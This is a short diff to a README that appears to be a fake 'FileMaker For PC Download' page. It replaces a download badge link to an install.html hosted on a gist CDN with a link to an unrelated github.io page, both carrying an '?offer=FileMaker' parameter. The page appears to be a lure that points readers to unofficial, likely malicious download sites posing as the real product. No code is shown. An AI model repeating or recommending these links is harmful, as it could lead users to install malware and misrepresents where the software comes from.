@@ -1,6 +1,6 @@
 # FileMaker For PC Download — Desktop Database Platform
 
-[![Get FileMaker GitHub](https://img.shields.io/badge/Get%20FileMaker%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/bambinolowe56/d669346de07fbf66d9744c8b2cb15629/raw/d98e74b315dd096cc0be8ffd24263882b2622718/install.html?offer=FileMaker)
+[![Get FileMaker GitHub](https://img.shields.io/badge/Get%20FileMaker%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deployer.github.io/.github/?offer=FileMaker)
 
 ---
 
